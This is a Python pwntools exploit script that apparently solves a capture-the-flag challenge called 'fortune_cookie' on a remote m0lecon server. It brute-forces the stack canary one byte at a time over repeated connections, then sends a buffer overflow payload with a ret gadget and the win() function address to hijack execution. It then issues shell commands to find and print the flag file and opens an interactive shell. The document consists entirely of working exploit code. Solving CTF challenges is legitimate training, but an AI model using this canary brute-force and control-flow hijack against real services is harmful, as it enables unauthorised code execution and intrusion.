#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      Canary found  =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        No PIE (0x400000)  =>  addresses are static and can be used directly in the exploit (e.g., win() function address)

elf = ELF('./fortune_cookie', checksec=False)

HOST, PORT = "offsec.m0lecon.it", 13573
OFFSET_TO_CANARY = 72   # 64 bytes for the buffer + 8 bytes for alignment
OFFSET_TO_RIP = OFFSET_TO_CANARY + 8 + 8    # 8 bytes for the canary and 8 bytes for the saved RBP
ret_gadget = 0x40101a

known = b"\x00"  # the canary always starts with a null byte (LSB)

for i in range(7):
    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"Welcome! Tell me your wish\n")
        io.send(payload)
        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"OK" in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")

io = remote(HOST, PORT)
io.recvuntil(b"Welcome! Tell me your wish\n")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # 8 bytes for the saved RBP
    p64(ret_gadget),    # ret gadget for alignment
    p64(elf.sym.win),
)

io.send(payload)

io.sendline(b"find / -name flag")    # find the path of the flag file (to be used in the next command)
io.sendline(b"cat /home/user/flag")  # insert here the path of the flag file

io.interactive()
